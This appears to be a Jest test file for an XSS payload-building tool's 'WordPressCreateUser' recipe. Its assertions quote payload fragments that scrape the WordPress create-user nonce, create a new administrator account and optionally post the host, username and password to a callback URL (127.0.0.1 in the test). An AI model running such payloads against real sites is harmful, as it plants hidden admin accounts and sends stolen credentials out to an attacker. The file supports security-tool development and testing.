import { cook, init, render, validate } from './WordPressCreateUser'
import { shallow } from 'enzyme'

describe('WordPressCreateUser', () => {
  const instance = {
    id: 'instance_id',
    adminPath: '/wp-admin',
    email: 'foo@bar.com',
    username: 'validuser',
    password: 'abcABC123!',
    role: 'administrator',
    callbackUrl: ''
  }

  const vars = {
    payload: '__XSS_CHEF_ENTRY_POINT__'
  }

  describe('.cook', () => {
    it('should build the new user URL without double slashes', () => {
      const payload = cook(Object.assign({}, instance, {
        adminPath: '/custom-path/'
      }), vars).payload

      expect(payload).toEqual(
        expect.stringContaining(
          `var newUserUrl = '/custom-path/user-new.php';`
        )
      )
    })

    it('should set the _wp_http_referer field to the new user URL', () => {
      const payload = cook(Object.assign({}, instance, {
        adminPath: '/custom-path/'
      }), vars).payload

      expect(payload).toEqual(
        expect.stringContaining(
          `data.append('_wp_http_referer', newUserUrl);`
        )
      )
    })

    it('should set the email field', () => {
      const payload = cook(instance, vars).payload

      expect(payload).toEqual(
        expect.stringContaining(
          `data.append('email', 'foo@bar.com');`
        )
      )
    })

    it('should set the password fields', () => {
      const payload = cook(instance, vars).payload

      expect(payload).toEqual(
        expect.stringContaining(
          `data.append('pass1', 'abcABC123!');`
        )
      )

      expect(payload).toEqual(
        expect.stringContaining(
          `data.append('pass2', 'abcABC123!');`
        )
      )
    })

    it('should set the role field', () => {
      const payload = cook(instance, vars).payload

      expect(payload).toEqual(
        expect.stringContaining(
          `data.append('role', 'administrator');`
        )
      )
    })

    it('should set the username field', () => {
      const payload = cook(instance, vars).payload

      expect(payload).toEqual(
        expect.stringContaining(
          `data.append('user_login', 'validuser');`
        )
      )
    })

    it('should acquire a nonce before creating the user', () => {
      const payload = cook(instance, vars).payload

      expect(payload).toEqual(
        expect.stringContaining(
          `ajaxRequest('GET', newUserUrl, undefined, instance_id_createUser);`
        )
      )

      expect(payload).toEqual(
        expect.stringContaining(
          `var nonce = xhr.response.match(/id="_wpnonce_create-user" name="_wpnonce_create-user" value="([a-z0-9]+)"/i)[1];`
        )
      )
    })

    it('should use the nonce when creating the user', () => {
      const payload = cook(instance, vars).payload

      expect(payload).toEqual(
        expect.stringContaining(
          `data.append('_wpnonce_create-user', nonce);`
        )
      )
    })

    describe('if a callback URL is specified', () => {
      it('should post the hostname, username and password to the callback', () => {
        const payload = cook(Object.assign({}, instance, {
          callbackUrl: 'http://127.0.0.1/'
        }), vars).payload

        expect(payload).toEqual(
          expect.stringContaining(
            `ajaxRequest('POST', 'http://127.0.0.1/', 'host=' + encodeURIComponent(location.host) + '&username=validuser&password=abcABC123!');`
          )
        )
      })
    })

    describe('if a callback URL is not specified', () => {
      it('should not post the hostname, username and password to the callback', () => {
        const payload = cook(instance, vars).payload

        expect(payload).not.toEqual(
          expect.stringContaining(
            `ajaxRequest('POST', 'http://127.0.0.1/', 'host=' + encodeURIComponent(location.host) + '&username=validuser&password=abcABC123%21');`
          )
        )
      })
    })

    it('should place the next entry point in the callback of the user creation request', () => {
      const payload = cook(instance, vars).payload
      expect(payload).toMatch(/'POST', newUserUrl, data, function \(\) {\s+.+\s+__XSS_CHEF_ENTRY_POINT__\s+}\)/)
    })
  })

  describe('.init', () => {
    it('should initialise {adminPath} with `/wp-admin`', () => {
      expect(init().adminPath).toBe('/wp-admin')
    })

    it('should initialise {role} with `administrator`', () => {
      expect(init().role).toBe('administrator')
    })

    it('should initialse {username} with a random alphabetic string', () => {
      expect(init().username).toMatch(/^[a-zA-Z]{8}$/)
    })

    it('should initialise {password} with a mix of alphanumeric and special chars', () => {
      expect(init().password).toMatch(/^[a-z]{3}[A-Z]{2}[0-9]{2}!$/)
    })

    it('should initialise {email} with a random email', () => {
      expect(init().email).toMatch(/^[a-zA-Z].+@[a-zA-Z]+\.com$/)
    })

    it('should initialise {callbackUrl}', () => {
      expect(init().callbackUrl).toBeDefined()
    })
  })

  describe('.render', () => {
    const setRecipeProperty = jest.fn()

    it('should render a RecipeTextField for the admin path`', () => {
      const wrapper = shallow(render(instance, setRecipeProperty))
      const textField = wrapper.find('RecipeTextField[bindTo="adminPath"]')
      expect(textField).toHaveLength(1)
      expect(textField.props()).toEqual({
        bindTo: 'adminPath',
        instance: instance,
        label: 'Admin Path',
        placeholder: 'Example: /wp-admin',
        setRecipeProperty: setRecipeProperty
      })
    })

    it('should render a RecipeTextField for the username`', () => {
      const wrapper = shallow(render(instance, setRecipeProperty))
      const textField = wrapper.find('RecipeTextField[bindTo="username"]')
      expect(textField).toHaveLength(1)
      expect(textField.props()).toEqual({
        bindTo: 'username',
        instance: instance,
        label: 'Username',
        placeholder: '',
        setRecipeProperty: setRecipeProperty
      })
    })

    it('should render a RecipeTextField for the e-mail address`', () => {
      const wrapper = shallow(render(instance, setRecipeProperty))
      const textField = wrapper.find('RecipeTextField[bindTo="email"]')
      expect(textField).toHaveLength(1)
      expect(textField.props()).toEqual({
        bindTo: 'email',
        instance: instance,
        label: 'E-mail Address',
        placeholder: '',
        setRecipeProperty: setRecipeProperty
      })
    })

    it('should render a RecipeTextField for the password`', () => {
      const wrapper = shallow(render(instance, setRecipeProperty))
      const textField = wrapper.find('RecipeTextField[bindTo="password"]')
      expect(textField).toHaveLength(1)
      expect(textField.props()).toEqual({
        bindTo: 'password',
        instance: instance,
        label: 'Password',
        placeholder: '',
        setRecipeProperty: setRecipeProperty
      })
    })

    it('should render a RecipeTextField for the user role`', () => {
      const wrapper = shallow(render(instance, setRecipeProperty))
      const textField = wrapper.find('RecipeTextField[bindTo="role"]')
      expect(textField).toHaveLength(1)
      expect(textField.props()).toEqual({
        bindTo: 'role',
        instance: instance,
        label: 'User Role',
        placeholder: 'Example: administrator',
        setRecipeProperty: setRecipeProperty
      })
    })

    it('should render a RecipeTextField for the callback URL`', () => {
      const wrapper = shallow(render(instance, setRecipeProperty))
      const textField = wrapper.find('RecipeTextField[bindTo="callbackUrl"]')
      expect(textField).toHaveLength(1)
      expect(textField.props()).toEqual({
        bindTo: 'callbackUrl',
        instance: instance,
        label: 'Callback URL (Optional)',
        placeholder: 'Example: http://your.domain.com/wp-user-created',
        setRecipeProperty: setRecipeProperty
      })
    })
  })

  describe('.validate', () => {
    it('should require a username of at least 4 chars', () => {
      expect(validate(Object.assign({}, instance, {
        username: 'a'
      }))).toBe(false)

      expect(validate(Object.assign({}, instance, {
        username: 'aaaa'
      }))).toBe(true)
    })

    it('should require a password of at least 8 mixed chars', () => {
      expect(validate(Object.assign({}, instance, {
        password: 'a1A!'
      }))).toBe(false)

      expect(validate(Object.assign({}, instance, {
        password: 'aaaaaaaa'
      }))).toBe(false)

      expect(validate(Object.assign({}, instance, {
        password: 'AAAAAAAA'
      }))).toBe(false)

      expect(validate(Object.assign({}, instance, {
        password: '!!!!!!!!'
      }))).toBe(false)

      expect(validate(Object.assign({}, instance, {
        username: 'abcABC123!'
      }))).toBe(true)
    })

    it('should require an admin path be specified', () => {
      expect(validate(Object.assign({}, instance, {
        adminPath: ''
      }))).toBe(false)

      expect(validate(Object.assign({}, instance, {
        adminPath: '/wp-admin'
      }))).toBe(true)
    })

    it('should require a role be specified', () => {
      expect(validate(Object.assign({}, instance, {
        role: ''
      }))).toBe(false)

      expect(validate(Object.assign({}, instance, {
        role: 'administrator'
      }))).toBe(true)
    })

    it('should require a valid e-mail', () => {
      expect(validate(Object.assign({}, instance, {
        email: 'asd'
      }))).toBe(false)

      expect(validate(Object.assign({}, instance, {
        email: 'foo@bar.com'
      }))).toBe(true)
    })
  })
})
